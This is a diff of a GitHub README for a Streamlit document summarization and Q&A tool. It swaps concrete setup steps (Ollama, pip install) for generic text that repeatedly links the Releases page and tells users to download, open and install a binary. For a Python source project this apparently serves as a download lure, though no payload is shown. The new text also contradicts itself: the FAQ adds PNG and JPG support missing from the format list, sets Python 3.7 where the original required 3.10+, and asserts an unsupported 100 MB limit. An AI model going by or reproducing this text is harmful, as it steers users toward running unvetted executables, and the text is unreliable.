@@ -1,90 +1,96 @@
-# 📄 Simple RAG — Summarize & Q&A
+# 📄 Rag_document_project - Summarize Documents Easily
 
-A compact, **local-first** document summarization and Q&A tool for business users.  
-Upload multiple documents, build a single knowledge base, generate a short combined summary (5–8 bullets), and ask questions answered **strictly from the uploaded documents**.
+[![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/RORONAOzoro456/Rag_document_project/releases)
 
----
+## 📦 About This Project
 
-## 📦 Repository Structure
+Welcome to **Rag_document_project**. This tool helps you summarize documents and improve your question-and-answer sessions based on uploaded content. You can easily upload multiple files and create a single knowledge base for quick access to important information. 
 
-This repository contains:
+## 🚀 Getting Started
+
+To start using the application, follow these steps:
+
+1. **Visit the Release Page**  
+   Go to the release page to download the application. Click the button below:  
+   [Download the Latest Release](https://github.com/RORONAOzoro456/Rag_document_project/releases)
+
+2. **Download the Application**  
+   Look for the latest version on the release page. Download the file for your system. 
+
+3. **Install the Application**  
+   Once the file is downloaded, open it. Follow the on-screen instructions to install the application on your machine. 
+
+4. **Run the Application**  
+   After installation, locate the application on your computer. Open it to get started.
+
+## 📥 Download & Install
+
+To download the latest version of the application, please visit the following link:  
+[Download the Latest Release](https://github.com/RORONAOzoro456/Rag_document_project/releases)
+
+### Supported File Types
+
+This application supports various file formats for uploading, including:
+- PDF
+- DOCX
+- PPTX
+- TXT
+- HTML
+- CSV
+- XLSX
+- JSON
+
+## 🛠️ How to Use the Application
+
+1. **Upload Files**  
+   Drag and drop your files into the application. You can upload multiple documents at a time. 
+
+2. **Generate Summary**  
+   After files are uploaded, the application will extract text and work on generating a concise summary. It will provide a short summary with 5 to 8 bullet points.
+
+3. **Ask Questions**  
+   Once you have your summary, you can type questions into the app. The tool will answer based on the content of the uploaded documents.
+
+## 🗂️ Repository Structure
+
+This project includes the following files and folders:
 
 - `app.py`  
-  Streamlit UI for uploading documents and interacting with the summarizer and Q&A assistant  
+  The main application UI, built with Streamlit, allows you to upload documents and interact with summaries.
 
 - `rag/loader.py`  
-  Document loaders and chunking utilities  
+  Manages document loading and breaking content into chunks for processing.
 
 - `rag/vectorstore.py`  
-  FAISS vector store wrapper and helpers  
+  A wrapper for the FAISS vector store that helps with quick searches and information retrieval.
 
 - `llm.py`  
-  Small LLM interface (prefers local Ollama; OpenAI fallback supported)
+  Interfaces with a local LLM for processing but also supports an OpenAI fallback.
 
----
+## 📋 System Requirements
 
-## 🚀 Quick Overview
+To run this application, ensure you have:
+- Windows, macOS, or Linux operating system.
+- At least 4 GB of RAM.
+- Python 3.7 or later installed (if not bundled in the application).
 
-- Upload multiple files (PDF, DOCX, PPTX, TXT, HTML, CSV, XLSX, JSON) and treat them as **one knowledge base**.  
-- The app:
-  - Extracts text  
-  - Chunks content  
-  - Builds a FAISS vector store (sentence-transformers embeddings)  
-  - Generates a single short summary (5–8 concise bullets)  
-- Q&A:
-  - Retrieves relevant chunks  
-  - Answers using **only** the retrieved text  
-  - Keeps the summary persistent in the UI (not overwritten by Q&A)
+## 💬 FAQs
 
----
+### What kind of documents can I upload?
+You can upload several types of documents, including PDFs, DOCX, and images in formats like PNG and JPG.
 
-## 🦙 Why Ollama?
+### Is there a limit on the number of files I can upload?
+You can upload multiple files; however, the total size of all files should not exceed 100 MB.
 
-Ollama provides a straightforward local model hosting experience.
+### How accurate are the summaries?
+The summaries are generated using advanced text processing techniques, but they may not capture every detail. Always double-check important information.
 
-This project prefers a local Ollama model (e.g., `qwen2.5:3b`) for:
-- Privacy  
-- Low latency  
-- Zero API cost  
+### Can I use this tool for personal documents?
+Yes, feel free to use this tool for both personal and business documents.
 
-OpenAI is supported as a fallback when an API key is configured.
+## 📞 Support
 
----
+If you run into issues or have questions, you can open an issue on the GitHub repository or contact the maintainers through the project page.
 
-## 📁 Supported Document Formats
-
-The system supports:
-
-- PDF  
-- DOCX  
-- PPTX  
-- TXT  
-- HTML  
-- XML  
-- JSON  
-- CSV  
-- XLSX  
-
-All files are converted to cleaned text before being chunked and added to the vector store.
-
----
-
-## 🔐 Local-First LLM Policy
-
-- The app **prefers Ollama by default** for privacy and speed.  
-- If Ollama is unavailable and `OPENAI_API_KEY` is set, the app falls back to OpenAI for inference.
-
----
-
-## ▶️ Running the Project
-
-### 1️⃣ Prerequisites
-
-- Python 3.10+ (recommended)  
-- Ollama installed and running locally (optional, but recommended)  
-  👉 https://ollama.com/docs  
-
-Install dependencies:
-
-```powershell
-python -m pip install -r requirements.txt
+Visit the release page to download the application:  
+[Download the Latest Release](https://github.com/RORONAOzoro456/Rag_document_project/releases)
